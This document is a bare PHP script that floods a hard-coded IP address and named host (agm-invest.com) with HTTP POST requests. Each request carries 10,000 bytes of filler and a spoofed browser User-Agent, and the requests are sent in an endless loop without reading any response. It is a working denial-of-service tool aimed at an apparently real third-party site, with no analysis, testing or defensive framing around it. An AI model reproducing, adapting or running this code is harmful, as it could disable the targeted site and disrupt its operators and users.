$data = str_repeat("A", 10000);

$ip = "13.251.108.88";
$host = "agm-invest.com";
$path = "/";
$post_data = 'data=' . $data;

while(1)
	{
	$socket = fsockopen($ip, 80, $errno, $errstr, 15);
	if (!$socket)
	{
		echo ' error: ' . $errno . ' ' . $errstr;
		die;
	}
	$http = "POST {$path} HTTP/1.1\r\n";
	$http .= "Host: {$host}\r\n";
	$http .= "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
	$http .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$http .= "Content-length: " . strlen($post_data) . "\r\n";
	$http .= "Connection: close\r\n\r\n";
	$http .= $post_data . "\r\n";
	
	fwrite($socket, $http);
	
	#$contents = "";
	#while (!feof($socket)) {
	#	$contents.= fgets($socket, 4096);
	#}

	fclose($socket);
	}
